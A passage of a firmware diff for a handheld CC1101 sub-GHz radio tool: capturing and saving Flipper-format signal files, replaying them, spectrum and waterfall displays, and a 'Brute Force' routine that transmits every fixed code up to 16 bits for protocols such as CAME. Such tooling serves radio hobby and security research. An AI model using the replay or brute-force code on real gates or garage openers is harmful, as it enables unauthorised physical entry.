+    f.seek(0); int idx = 0;
+    while (f.available() && idx < total) {
+        String line = f.readStringUntil('\n'); line.trim();
+        if (line.startsWith("RAW_Data:")) {
+            String data = line.substring(10); int pos = 0;
+            while (pos < (int)data.length() && idx < total) {
+                while (pos < (int)data.length() && data[pos] == ' ') pos++;
+                int end = pos;
+                while (end < (int)data.length() && data[end] != ' ') end++;
+                if (end > pos) buf[idx++] = data.substring(pos, end).toInt();
+                pos = end;
+            }
+        }
+    }
+    f.close();
+    *out_count = idx;
+    Serial.printf("[LOAD] %s: %d pulses from SD\n", path, idx);
+    return buf;
+}
+
+void cc_capture_raw(int duration_ms) {
+    cc_raw_count = 0;
+    cc_set_raw_rx();
+    cc_isr_start();
+    unsigned long deadline = millis() + duration_ms;
+    unsigned long last_activity = millis();
+
+    while (millis() < deadline && cc_raw_count < CC_MAX_PULSES - 1) {
+        // Drain ISR buffer into raw pulse array
+        bool level; int32_t dur;
+        while (cc_isr_read(&level, &dur) && cc_raw_count < CC_MAX_PULSES - 1) {
+            cc_raw_pulses[cc_raw_count++] = level ? dur : -dur;
+            last_activity = millis();
+        }
+        // Check keys
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) break;
+        if (millis() - last_activity > 500 && cc_raw_count > 10) break;
+        delay(1);
+    }
+    cc_isr_stop();
+}
+
+// ── .sub file save/load ──
+
+bool cc_save_sub(const char* path, uint32_t freq_hz, const char* preset,
+                 int32_t* pulses, int count) {
+    File f = SD.open(path, FILE_WRITE);
+    if (!f) return false;
+    f.println("Filetype: Flipper SubGhz RAW File");
+    f.println("Version: 1");
+    f.printf("Frequency: %lu\n", freq_hz);
+    f.printf("Preset: FuriHalSubGhzPreset%s\n", preset);
+    f.println("Protocol: RAW");
+    f.print("RAW_Data:");
+    for (int i = 0; i < count; i++) {
+        f.printf(" %d", pulses[i]);
+        if ((i+1) % 512 == 0 && i+1 < count) f.print("\nRAW_Data:");
+    }
+    f.println(); f.close();
+    return true;
+}
+
+bool cc_save_sub_key(const char* path, uint32_t freq_hz, const SubGhzDecoded& d) {
+    File f = SD.open(path, FILE_WRITE);
+    if (!f) return false;
+    f.println("Filetype: Flipper SubGhz Key File");
+    f.println("Version: 1");
+    f.printf("Frequency: %lu\n", freq_hz);
+    f.printf("Preset: FuriHalSubGhzPreset%s\n", cc_presets[cc_preset_idx].sub_name);
+    f.printf("Protocol: %s\n", d.protocol);
+    f.printf("Bit: %d\n", d.bit_count);
+    int nb = max(1, (d.bit_count + 7) / 8);
+    f.printf("Key: ");
+    uint64_t mask = d.data & ((d.bit_count < 64) ? ((1ULL << d.bit_count) - 1) : 0xFFFFFFFFFFFFFFFFULL);
+    for (int i = nb - 1; i >= 0; i--) f.printf("%02X ", (uint8_t)(mask >> (i * 8)));
+    f.println();
+    if (d.te > 0) f.printf("TE: %d\n", d.te);
+    f.close();
+    return true;
+}
+
+int cc_load_sub(const char* path, uint32_t* freq_hz, int32_t* pulses, int max_pulses) {
+    File f = SD.open(path, FILE_READ);
+    if (!f) return 0;
+    int count = 0;
+    *freq_hz = 433920000;
+    while (f.available() && count < max_pulses) {
+        String line = f.readStringUntil('\n');
+        line.trim();
+        if (line.startsWith("Frequency:")) {
+            *freq_hz = (uint32_t)line.substring(11).toInt();
+        } else if (line.startsWith("RAW_Data:")) {
+            String data = line.substring(10);
+            int pos = 0;
+            while (pos < (int)data.length() && count < max_pulses) {
+                while (pos < (int)data.length() && data[pos] == ' ') pos++;
+                int end = pos;
+                while (end < (int)data.length() && data[end] != ' ') end++;
+                if (end > pos) pulses[count++] = data.substring(pos, end).toInt();
+                pos = end;
+            }
+        }
+    }
+    f.close();
+    return count;
+}
+
+// ── Send raw OOK via FIFO streaming ──
+
+bool cc_send_raw(int32_t* pulses, int count, int repeat) {
+    if (count == 0) return false;
+
+    // Configure CC1101 for async serial OOK TX
+    cc_strobe(CC_SIDLE); delay(1);
+    cc_write_reg(CC_IOCFG0, 0x0D);   // async serial data I/O (bidirectional)
+    cc_write_reg(CC_PKTCTRL0, 0x32);  // async serial mode, infinite packet
+    cc_write_reg(CC_MDMCFG2, 0x30);   // OOK modulation, no sync
+    cc_write_reg(CC_FREND0, 0x11);    // PA table index 1 for logic HIGH
+    // 3.8kbps data rate (Flipper convention: better noise immunity for OOK)
+    cc_write_reg(CC_MDMCFG4, 0x67);   // DRATE_E=7
+    cc_write_reg(CC_MDMCFG3, 0x32);   // DRATE_M=50 → ~3.79 kbps
+    uint8_t pa_ook[8] = {0x00, 0xC0, 0, 0, 0, 0, 0, 0};
+    cc_write_burst(CC_PA_TABLE, pa_ook, 8);
+    cc_set_rf_switch(cc_freq_mhz);
+
+    // Set GDO0 as OUTPUT, start LOW (no carrier)
+    pinMode(CC_GDO0, OUTPUT);
+    digitalWrite(CC_GDO0, LOW);
+
+    // Calibrate and enter TX
+    cc_strobe(CC_SFTX);
+    cc_strobe(0x33);  // SCAL
+    delay(2);
+    cc_strobe(CC_STX);
+    delay(1);
+
+    uint8_t marc = cc_read_status(CC_MARCSTATE) & 0x1F;
+    if (repeat < 10) repeat = 10;
+    Serial.printf("[TX] %d pulses x%d, MARC=0x%02X\n", count, repeat, marc);
+
+    // TX via absolute-time GPIO — direct register writes, <1µs jitter
+    uint32_t gdo0_mask = (1ULL << CC_GDO0);
+    GPIO.out_w1tc = gdo0_mask;
+    delayMicroseconds(2000);
+    for (int r = 0; r < repeat; r++) {
+        uint32_t t = (uint32_t)esp_timer_get_time();
+        for (int i = 0; i < count; i++) {
+            int32_t dur = abs(pulses[i]);
+            if (dur < 10) dur = 10;
+            if (dur > 200000) dur = 200000;
+            if (pulses[i] > 0) GPIO.out_w1ts = gdo0_mask;
+            else               GPIO.out_w1tc = gdo0_mask;
+            t += (uint32_t)dur;
+            while ((uint32_t)esp_timer_get_time() < t) ;
+        }
+    }
+
+    // Carrier OFF, return to IDLE
+    GPIO.out_w1tc = gdo0_mask;
+    delayMicroseconds(500);
+    cc_strobe(CC_SIDLE);
+    pinMode(CC_GDO0, INPUT);
+    cc_apply_preset(cc_preset_idx);
+    cc_set_frequency(cc_freq_mhz);
+    Serial.println("[TX] done");
+    return true;
+}
+
+// ── Signal encoder (reconstruct pulses from decoded data for replay) ──
+
+int cc_encode_signal(const SubGhzDecoded& sig, int32_t* pulses, int max_pulses) {
+    if (sig.is_rolling || sig.te <= 0) return 0;
+    const SubGhzProto* cfg = nullptr;
+    for (int i = 0; i < (int)CC_NUM_TABLE_PROTOS; i++) {
+        if (strcmp(cc_proto_table[i].name, sig.protocol) == 0) { cfg = &cc_proto_table[i]; break; }
+    }
+    if (!cfg) return 0;
+
+    int pos = 0;
+    int ts = cfg->te_short, tl = cfg->te_long;
+    // Header — CAME uses bit-count-dependent multiplier (Flipper convention)
+    int hdr_mult = cfg->header_mult;
+    if (strcmp(cfg->name, "CAME") == 0) {
+        if (sig.bit_count == 24 || sig.bit_count == 42) hdr_mult = 76;
+        else if (sig.bit_count <= 18) hdr_mult = 47;
+        else if (sig.bit_count == 25) hdr_mult = 36;
+        else hdr_mult = 16;
+    }
+    pulses[pos++] = -(ts * hdr_mult);
+    if (cfg->has_start_bit && cfg->style == STYLE_CAME)
+        pulses[pos++] = ts;
+    // Data bits (invert for Ansonic-style protocols)
+    for (int i = sig.bit_count - 1; i >= 0 && pos < max_pulses - 4; i--) {
+        bool bit = ((sig.data >> i) & 1) ^ (cfg->invert_bits ? 1 : 0);
+        if (cfg->style == STYLE_CAME) {
+            pulses[pos++] = bit ? -(tl) : -(ts);
+            pulses[pos++] = bit ? ts : tl;
+        } else {
+            pulses[pos++] = bit ? tl : ts;
+            pulses[pos++] = bit ? -(ts) : -(tl);
+        }
+    }
+    // No footer — the header of the next repeat provides the inter-frame silence.
+    // Adding a footer would double the gap when repeating (footer+header merge).
+    return pos;
+}
+
+// ── Brute Force (iterate all codes for a given protocol) ──
+
+void cc_brute_force(const SubGhzDecoded& base_sig, LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
+    const int W = 240, H = 135;
+    int total = 1 << base_sig.bit_count;
+    if (base_sig.bit_count > 16 || base_sig.bit_count < 1) {
+        sp.fillScreen(TFT_BLACK);
+        sp.setTextColor(TFT_RED, TFT_BLACK);
+        sp.setCursor(10, 55); sp.printf("Can't brute %d bits (%d codes)", base_sig.bit_count, total);
+        if (use_sprite) sprite->pushSprite(0, 0);
+        delay(2000); return;
+    }
+
+    // Configure CC1101 for TX once
+    cc_strobe(CC_SIDLE); delay(1);
+    cc_write_reg(CC_IOCFG0, 0x2E);
+    cc_write_reg(CC_PKTCTRL0, 0x32);
+    cc_write_reg(CC_MDMCFG2, 0x30);
+    cc_write_reg(CC_FREND0, 0x11);
+    cc_write_reg(CC_MDMCFG4, 0x5B);
+    cc_write_reg(CC_MDMCFG3, 0xF8);
+    uint8_t pa_ook[8] = {0x00, 0xC0, 0, 0, 0, 0, 0, 0};
+    cc_write_burst(CC_PA_TABLE, pa_ook, 8);
+    cc_set_rf_switch(cc_freq_mhz);
+    pinMode(CC_GDO0, OUTPUT);
+    digitalWrite(CC_GDO0, LOW);
+    cc_strobe(CC_SFTX); cc_strobe(0x33); delay(2);
+    cc_strobe(CC_STX); delay(1);
+
+    uint32_t gdo0_mask = (1ULL << CC_GDO0);
+    int32_t pulses[128];
+    SubGhzDecoded sig = base_sig;
+    unsigned long t_start = millis();
+    int sent = 0;
+
+    for (int code = 0; code < total; code++) {
+        // Check cancel
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+
+        sig.data = (uint64_t)code;
+        int enc_count = cc_encode_signal(sig, pulses, 128);
+        if (enc_count <= 0) continue;
+
+        // Send 3 repeats per code (enough for a receiver to catch)
+        for (int r = 0; r < 3; r++) {
+            uint32_t t = (uint32_t)esp_timer_get_time();
+            for (int i = 0; i < enc_count; i++) {
+                int32_t dur = abs(pulses[i]);
+                if (dur < 10) dur = 10;
+                if (dur > 200000) dur = 200000;
+                if (pulses[i] > 0) GPIO.out_w1ts = gdo0_mask;
+                else               GPIO.out_w1tc = gdo0_mask;
+                t += (uint32_t)dur;
+                while ((uint32_t)esp_timer_get_time() < t) ;
+            }
+        }
+        sent++;
+
+        // Update display every 32 codes
+        if ((code & 0x1F) == 0 || code == total - 1) {
+            int pct = (code + 1) * 100 / total;
+            unsigned long elapsed = (millis() - t_start) / 1000;
+            unsigned long eta = elapsed > 0 ? (unsigned long)((float)elapsed / (code+1) * (total - code - 1)) : 0;
+
+            sp.fillScreen(TFT_BLACK);
+            sp.fillRect(0, 0, W, 14, 0x0841);
+            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+            sp.printf("Brute %s %d-bit", sig.protocol, sig.bit_count);
+            sp.setTextColor(TFT_GREEN, TFT_BLACK);
+            sp.setCursor(10, 22); sp.printf("Code: 0x%0*X / 0x%X", (sig.bit_count+3)/4, code, total-1);
+            sp.fillRect(10, 42, 220, 12, 0x2104);
+            sp.fillRect(10, 42, pct * 220 / 100, 12, TFT_GREEN);
+            sp.setCursor(10, 60); sp.printf("%d%% — %d sent", pct, sent);
+            sp.setCursor(10, 76); sp.printf("Elapsed: %lus  ETA: %lus", elapsed, eta);
+            sp.fillRect(0, H-14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+            sp.print("BACK=stop");
+            if (use_sprite) sprite->pushSprite(0, 0);
+        }
+    }
+
+    // Cleanup
+    GPIO.out_w1tc = gdo0_mask;
+    delayMicroseconds(500);
+    cc_strobe(CC_SIDLE);
+    pinMode(CC_GDO0, INPUT);
+    cc_apply_preset(cc_preset_idx);
+    cc_set_frequency(cc_freq_mhz);
+
+    sp.fillScreen(TFT_BLACK);
+    sp.setTextColor(TFT_GREEN, TFT_BLACK);
+    sp.setCursor(10, 50); sp.printf("Done! %d codes sent", sent);
+    sp.setCursor(10, 70); sp.printf("%lus total", (millis() - t_start) / 1000);
+    sp.fillRect(0, H-14, W, 14, 0x0841);
+    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
+    if (use_sprite) sprite->pushSprite(0, 0);
+    while (true) {
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+        delay(10);
+    }
+}
+
+// ── Spectrum Analyzer (Flipper Zero style) ──
+
+void cc_spectrum_analyzer(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
+    const int W = 240, H = 135;
+    const int GRAPH_Y = 16, GRAPH_H = 98, GRAPH_BOT = GRAPH_Y + GRAPH_H;
+    const int NS = 240;
+
+    struct SpecBand { const char* name; float start_mhz; float end_mhz; };
+    const SpecBand bands[] = {
+        {"315 MHz", 310.0f, 320.0f}, {"433 MHz", 425.0f, 445.0f},
+        {"868 MHz", 860.0f, 875.0f}, {"915 MHz", 905.0f, 925.0f},
+        {"Full",    300.0f, 928.0f},
+    };
+    int band_idx = 1;
+    float view_start = bands[1].start_mhz, view_end = bands[1].end_mhz;
+    int cursor = NS / 2;
+    float rssi[NS], peak_rssi[NS];
+    for (int i = 0; i < NS; i++) { rssi[i] = -130; peak_rssi[i] = -130; }
+    float peak_freq = 0, peak_db = -130;
+    cc_apply_preset(0);
+
+    while (true) {
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+        if (kp(KEY_TAB)) {
+            keyRelease(); band_idx = (band_idx + 1) % 5;
+            view_start = bands[band_idx].start_mhz; view_end = bands[band_idx].end_mhz;
+            for (int i = 0; i < NS; i++) peak_rssi[i] = -130; peak_db = -130;
+        }
+        if (kp('+') || kp('=')) cursor = min(cursor + 4, NS - 1);
+        if (kp('-') || kp('_')) cursor = max(cursor - 4, 0);
+        if (kp('r') || kp('R')) { for (int i = 0; i < NS; i++) peak_rssi[i] = -130; peak_db = -130; }
+        // Navigate left/right when zoomed
+        if (kp(',')) {
+            float shift = (view_end - view_start) * 0.2f;
+            if (view_start - shift >= 300.0f) { view_start -= shift; view_end -= shift;
+                for (int i = 0; i < NS; i++) peak_rssi[i] = -130; peak_db = -130; }
+        }
+        if (kp('/')) {
+            float shift = (view_end - view_start) * 0.2f;
+            if (view_end + shift <= 928.0f) { view_start += shift; view_end += shift;
+                for (int i = 0; i < NS; i++) peak_rssi[i] = -130; peak_db = -130; }
+        }
+        if (kp(KEY_ENTER)) {
+            keyRelease();
+            float center = view_start + (view_end - view_start) * cursor / (float)NS;
+            float span = max(1.0f, (view_end - view_start) / 3.0f);
+            view_start = max(300.0f, center - span / 2); view_end = min(928.0f, center + span / 2);
+            for (int i = 0; i < NS; i++) peak_rssi[i] = -130; peak_db = -130; cursor = NS / 2;
+        }
+
+        float step = (view_end - view_start) / NS;
+        float sw_pk_db = -130, sw_pk_f = 0;
+        for (int i = 0; i < NS; i++) {
+            float f = view_start + step * i;
+            cc_set_frequency(f); cc_start_rx(); delayMicroseconds(1500);
+            rssi[i] = cc_get_rssi();
+            if (rssi[i] > peak_rssi[i]) peak_rssi[i] = rssi[i];
+            if (rssi[i] > sw_pk_db) { sw_pk_db = rssi[i]; sw_pk_f = f; }
+        }
+        if (sw_pk_db > peak_db) { peak_db = sw_pk_db; peak_freq = sw_pk_f; }
+
+        sp.fillScreen(TFT_BLACK);
+        sp.fillRect(0, 0, W, GRAPH_Y, 0x0841); sp.drawFastHLine(0, GRAPH_Y, W, 0xFC00);
+        sp.setTextSize(1); sp.setTextFont(1);
+        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 4);
+        sp.printf("Spectrum %s", bands[band_idx].name);
+        float cf = view_start + step * cursor;
+        sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(130, 4);
+        sp.printf("%.2fMHz %.0fdB", cf, rssi[cursor]);
+
+        float db_min = -120, db_max = -30, db_range = db_max - db_min;
+        for (float gd = -90; gd <= -60; gd += 30) {
+            int gy = GRAPH_BOT - (int)(((gd - db_min) / db_range) * GRAPH_H);
+            for (int x = 0; x < W; x += 4) sp.drawPixel(x, gy, 0x2104);
+            sp.setTextColor(0x3186, TFT_BLACK); sp.setCursor(0, gy - 4); sp.printf("%d", (int)gd);
+        }
+        for (int i = 0; i < NS; i++) {
+            float n = max(0.0f, min(1.0f, (rssi[i] - db_min) / db_range));
+            int bh = (int)(n * GRAPH_H);
+            if (bh > 1) {
+                uint16_t c = rssi[i] > -50 ? TFT_YELLOW : (rssi[i] > -70 ? TFT_GREEN : 0x03E0);
+                sp.drawFastVLine(i, GRAPH_BOT - bh, bh, c);
+            }
+            float pn = max(0.0f, min(1.0f, (peak_rssi[i] - db_min) / db_range));
+            if (peak_rssi[i] > -120) sp.drawPixel(i, GRAPH_BOT - (int)(pn * GRAPH_H), TFT_RED);
+        }
+        sp.drawFastVLine(cursor, GRAPH_Y + 1, GRAPH_H, TFT_WHITE);
+        if (peak_db > -120) {
+            sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(W-90, GRAPH_Y+3);
+            sp.printf("Pk:%.1fMHz", peak_freq);
+            sp.setCursor(W-90, GRAPH_Y+13); sp.printf("   %.0fdBm", peak_db);
+        }
+        sp.setTextColor(0x5AEB, TFT_BLACK);
+        sp.setCursor(2, GRAPH_BOT+2); sp.printf("%.1f", view_start);
+        sp.setCursor(W/2-16, GRAPH_BOT+2); sp.printf("%.1f", (view_start+view_end)/2);
+        sp.setCursor(W-36, GRAPH_BOT+2); sp.printf("%.1f", view_end);
+        sp.fillRect(0, H-12, W, 12, 0x0841); sp.setTextColor(0x5AEB, 0x0841);
+        sp.setCursor(2, H-10); sp.print("+/-=cur TAB=band ENT=zoom R=rst");
+        if (use_sprite) sprite->pushSprite(0, 0);
+    }
+    cc_set_frequency(cc_frequencies[cc_freq_idx] * 1000 / 1000000.0f);
+}
+
+// ── Waterfall SDR (scrolling spectrogram) ──
+
+void cc_waterfall(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
+    const int W = 240, H = 135;
+    const int SPEC_H = 36; // spectrum peaks area height
+    const int WF_Y = 16 + SPEC_H, WF_H = 106 - SPEC_H, WF_BOT = WF_Y + WF_H;
+    const int NS = 240;
+
+    struct WfBand { const char* name; float start; float end; };
+    const WfBand bands[] = {
+        {"315 MHz", 310.0f, 320.0f}, {"433 MHz", 425.0f, 445.0f},
+        {"433 Narrow", 433.0f, 435.0f}, {"868 MHz", 860.0f, 875.0f},
+        {"915 MHz", 905.0f, 925.0f}, {"Full", 300.0f, 928.0f},
+    };
+    const int NB = 6;
+    int band_idx = 1;
+    float view_start = bands[1].start, view_end = bands[1].end;
+
+    // Waterfall buffer: each row = 1 sweep, stored as uint8_t (0-255 mapped from RSSI)
+    uint8_t* wf_buf = (uint8_t*)malloc(NS * WF_H);
+    if (!wf_buf) return;
+    memset(wf_buf, 0, NS * WF_H);
+    int wf_row = 0;
+
+    float peak_freq = 0, peak_db = -130;
+    cc_apply_preset(0);
+
+    // Adaptive noise floor for better contrast
+    float noise_floor = -100.0f;
+    // Peak hold for spectrum curve
+    float spec_peak[240];
+    for (int i = 0; i < NS; i++) spec_peak[i] = -130.0f;
+
+    // RSSI to color (vivid SDR-style: black → deep blue → cyan → green → yellow → red → white)
+    auto rssi_color = [&noise_floor](float db) -> uint16_t {
+        float above = db - noise_floor;
+        if (above < 1.5f) return TFT_BLACK;
+        float n = min(1.0f, above / 35.0f);
+        int v = (int)(n * 1279);
+        if (v < 160) { return (v / 5); }                                          // black → blue
+        if (v < 320) { int b = 31; int g = (v-160)/5; return (g << 5) | b; }      // blue → cyan
+        if (v < 512) { int g = 32 + (v-320)/6; return (g << 5); }                 // cyan → green
+        if (v < 768) { int r = (v-512)/8; int g = 63; return (r << 11) | (g << 5); } // green → yellow
+        if (v < 1024) { int r = 31; int g = 63 - (v-768)/4; return (r << 11) | (g << 5); } // yellow → red
+        { int r = 31; int g = (v-1024)/4; int b = (v-1024)/8; return (r << 11) | (g << 5) | b; } // red → white
+    };
+
+    while (true) {
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+        if (kp(KEY_TAB)) {
+            keyRelease(); band_idx = (band_idx + 1) % NB;
+            view_start = bands[band_idx].start; view_end = bands[band_idx].end;
+            memset(wf_buf, 0, NS * WF_H); wf_row = 0; peak_db = -130;
+        }
+        if (kp(KEY_ENTER)) {
+            keyRelease();
+            float center = (view_start + view_end) / 2;
+            float span = max(1.0f, (view_end - view_start) / 3.0f);
+            view_start = max(300.0f, center - span/2);
+            view_end = min(928.0f, center + span/2);
+            memset(wf_buf, 0, NS * WF_H); wf_row = 0; peak_db = -130;
+        }
+        // Navigate left (,) / right (/)
+        if (kp(',')) {
+            keyRelease();
+            float shift = (view_end - view_start) * 0.2f;
+            if (view_start - shift >= 300.0f) { view_start -= shift; view_end -= shift; }
+            memset(wf_buf, 0, NS * WF_H); wf_row = 0;
+        }
+        if (kp('/')) {
+            keyRelease();
+            float shift = (view_end - view_start) * 0.2f;
+            if (view_end + shift <= 928.0f) { view_start += shift; view_end += shift; }
+            memset(wf_buf, 0, NS * WF_H); wf_row = 0;
+        }
+        // Adjust noise floor
+        if (kp('+') || kp('=')) { keyRelease(); noise_floor += 2.0f; }
+        if (kp('-') || kp('_')) { keyRelease(); noise_floor -= 2.0f; }
+        if (kp('r') || kp('R')) { memset(wf_buf, 0, NS * WF_H); wf_row = 0; peak_db = -130; }
+
+        // Sweep
+        float step = (view_end - view_start) / NS;
+        float sw_pk = -130, sw_pk_f = 0;
+        int row_offset = (wf_row % WF_H) * NS;
+        for (int i = 0; i < NS; i++) {
+            float f = view_start + step * i;
+            cc_set_frequency(f); cc_start_rx(); delayMicroseconds(1200);
+            float db = cc_get_rssi();
+            // Scale to 0-255
+            int v = (int)((db + 120.0f) * (255.0f / 80.0f));
+            wf_buf[row_offset + i] = (uint8_t)max(0, min(255, v));
+            if (db > sw_pk) { sw_pk = db; sw_pk_f = f; }
+        }
+        if (sw_pk > peak_db) { peak_db = sw_pk; peak_freq = sw_pk_f; }
+        wf_row++;
+
+        // Draw
+        sp.fillScreen(TFT_BLACK);
+        // Header
+        sp.fillRect(0, 0, W, WF_Y, 0x0841);
+        sp.drawFastHLine(0, WF_Y, W, 0xFC00);
+        sp.setTextSize(1); sp.setTextFont(1);
+        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 4);
+        sp.printf("Waterfall %s", bands[band_idx].name);
+        if (peak_db > -110) {
+            sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(140, 4);
+            sp.printf("Pk:%.2fMHz %.0fdB", peak_freq, peak_db);
+        }
+
+        // Spectrum peaks curve (SDR-style, above waterfall)
+        int spec_y = 16;
+        int spec_h = SPEC_H;
+        int spec_bot = spec_y + spec_h - 1;
+        sp.drawFastHLine(0, spec_y + spec_h, W, 0x2104);
+        int last_row = ((wf_row - 1) % WF_H) * NS;
+
+        // Update peak hold
+        for (int x = 0; x < NS; x++) {
+            float db = (float)wf_buf[last_row + x] * 80.0f / 255.0f - 120.0f;
+            if (db > spec_peak[x]) spec_peak[x] = db;
+        }
+
+        // Filled area under curve (gradient fill)
+        for (int x = 0; x < NS; x++) {
+            float db = (float)wf_buf[last_row + x] * 80.0f / 255.0f - 120.0f;
+            float n = max(0.0f, min(1.0f, (db - noise_floor) / 15.0f));
+            int yp = spec_bot - (int)(n * (spec_h - 4));
+            if (yp < spec_bot - 1) {
+                int fill_h = spec_bot - yp;
+                uint16_t fc = 0x0120;
+                if (n > 0.5f) fc = 0x0200;
+                if (n > 0.8f) fc = 0x0320;
+                sp.drawFastVLine(x, yp, fill_h, fc);
+            }
+        }
+
+        // Main curve line (2px thick for visibility)
+        for (int x = 1; x < NS; x++) {
+            float db0 = (float)wf_buf[last_row + x - 1] * 80.0f / 255.0f - 120.0f;
+            float db1 = (float)wf_buf[last_row + x] * 80.0f / 255.0f - 120.0f;
+            float n0 = max(0.0f, min(1.0f, (db0 - noise_floor) / 15.0f));
+            float n1 = max(0.0f, min(1.0f, (db1 - noise_floor) / 15.0f));
+            int y0 = spec_bot - (int)(n0 * (spec_h - 4));
+            int y1 = spec_bot - (int)(n1 * (spec_h - 4));
+            uint16_t lc = TFT_GREEN;
+            if (n1 > 0.6f) lc = TFT_YELLOW;
+            if (n1 > 0.85f) lc = TFT_RED;
+            sp.drawLine(x - 1, y0, x, y1, lc);
+            sp.drawLine(x - 1, y0 - 1, x, y1 - 1, lc);
+        }
+
+        // Peak hold dots (red)
+        for (int x = 0; x < NS; x++) {
+            float pn = max(0.0f, min(1.0f, (spec_peak[x] - noise_floor) / 15.0f));
+            int py = spec_bot - (int)(pn * (spec_h - 4));
+            if (spec_peak[x] > noise_floor + 2.0f) {
+                sp.drawPixel(x, py, TFT_RED);
+                sp.drawPixel(x, py - 1, TFT_RED);
+            }
+        }
+
+        // Waterfall: draw from newest (top) to oldest (bottom)
+        int total_rows = min(wf_row, WF_H);
+        for (int y = 0; y < total_rows; y++) {
+            int buf_row = ((wf_row - 1 - y) % WF_H) * NS;
+            for (int x = 0; x < NS; x++) {
+                float db = (float)wf_buf[buf_row + x] * 80.0f / 255.0f - 120.0f;
+                uint16_t c = rssi_color(db);
+                if (c != TFT_BLACK)
+                    sp.drawPixel(x, WF_Y + 1 + y, c);
+            }
+        }
+
+        // Freq labels
+        sp.setTextColor(0x5AEB, TFT_BLACK);
+        sp.setCursor(2, WF_BOT + 1); sp.printf("%.1f", view_start);
+        sp.setCursor(W/2-16, WF_BOT + 1); sp.printf("%.1f", (view_start+view_end)/2);
+        sp.setCursor(W-36, WF_BOT + 1); sp.printf("%.1f", view_end);
+
+        // Bottom
+        sp.fillRect(0, H-12, W, 12, 0x0841);
+        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(2, H-10);
+        sp.printf(",/=nav TAB=band ENT=zm +/-=flr:%.0f", noise_floor);
+        if (use_sprite) sprite->pushSprite(0, 0);
+    }
+
+    free(wf_buf);
+    cc_set_frequency(cc_frequencies[cc_freq_idx] * 1000 / 1000000.0f);
+}
+
+// ── Sub-GHz Menu (Flipper-style UI with sprite rendering) ──
+
+void subGhzMenu() {
+    keyRelease();
+    const int W = 240, H = 135;
+
+    cc_raw_buf = (int32_t*)malloc(CC_RAW_BUF_SIZE * sizeof(int32_t));
+    cc_raw_pulses = (int32_t*)malloc(CC_MAX_PULSES * sizeof(int32_t));
+    if (!cc_raw_buf || !cc_raw_pulses) {
+        free(cc_raw_buf); free(cc_raw_pulses);
+        cc_raw_buf = nullptr; cc_raw_pulses = nullptr;
+        M5.Display.clear(TFT_BLACK); M5.Display.setCursor(10,60);
+        M5.Display.print("CC1101 alloc failed"); M5.Display.display();
+        delay(2000); inMenu = true; return;
+    }
+    memset(cc_raw_buf, 0, CC_RAW_BUF_SIZE * sizeof(int32_t));
+    memset(cc_raw_pulses, 0, CC_MAX_PULSES * sizeof(int32_t));
+
+    // Open CC1101
+    M5.Display.clear(TFT_BLACK);
+    M5.Display.setTextSize(1); M5.Display.setTextFont(1);
+    M5.Display.setTextColor(TFT_ORANGE, TFT_BLACK);
+    M5.Display.setCursor(10, 50); M5.Display.print("Opening CC1101...");
+    M5.Display.display();
+    if (!cc_open()) {
+        M5.Display.setCursor(10, 70); M5.Display.setTextColor(TFT_RED, TFT_BLACK);
+        M5.Display.print("CC1101 not found! Check Cap HAT");
+        M5.Display.display(); delay(2000); inMenu = true; return;
+    }
+
+    M5Canvas* sprite = new(std::nothrow) M5Canvas(&M5.Display);
+    bool use_sprite = false;
+    if (sprite) { sprite->setColorDepth(8); use_sprite = sprite->createSprite(W, H); }
+    auto& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
+
+    const char* items[] = {"Read (decode)", "Read RAW (capture)",
+                           "Saved (replay .sub)", "Freq Analyzer",
+                           "Spectrum Analyzer", "Waterfall SDR",
+                           "Brute Force"};
+    const int cc_item_count = 7;
+    const int cc_lineH = 16;
+    const int cc_listY = 18;
+    const int cc_maxVis = (H - cc_listY - 14) / cc_lineH;
+    int cc_sel = 0, cc_start = 0;
+
+    while (true) {
+        bool cc_need_draw = true;
+        int mode = 0;
+        while (!mode) {
+            if (cc_need_draw) {
+                if (cc_sel < cc_start) cc_start = cc_sel;
+                if (cc_sel >= cc_start + cc_maxVis) cc_start = cc_sel - cc_maxVis + 1;
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 16, 0x0841);
+                sp.drawFastHLine(0, 16, W, 0xFC00);
+                sp.setTextFont(1);
+                sp.setTextSize(1.5);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(50, 2); sp.print("Cap Sub-GHz");
+                sp.setTextSize(1.5);
+                for (int i = 0; i < cc_maxVis && (cc_start + i) < cc_item_count; i++) {
+                    int idx = cc_start + i;
+                    int y = cc_listY + i * cc_lineH;
+                    if (idx == cc_sel) {
+                        sp.fillRect(0, y, W, cc_lineH, TFT_NAVY);
+                        sp.setTextColor(TFT_GREEN, TFT_NAVY);
+                    } else {
+                        sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                    }
+                    sp.setCursor(10, y + 2); sp.print(items[idx]);
+                }
+                sp.fillRect(0, H - 14, W, 14, 0x0841);
+                sp.setTextSize(1);
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
+                sp.print(";/. ENT BACK");
+                if (use_sprite) sprite->pushSprite(0, 0);
+                cc_need_draw = false;
+            }
+            M5.update(); cardUpdate();
+            if (kp(KEY_BACKSPACE)) { keyRelease(); goto sub_exit; }
+            if (kp(';')) { cc_sel = (cc_sel - 1 + cc_item_count) % cc_item_count; cc_need_draw = true; delay(150); }
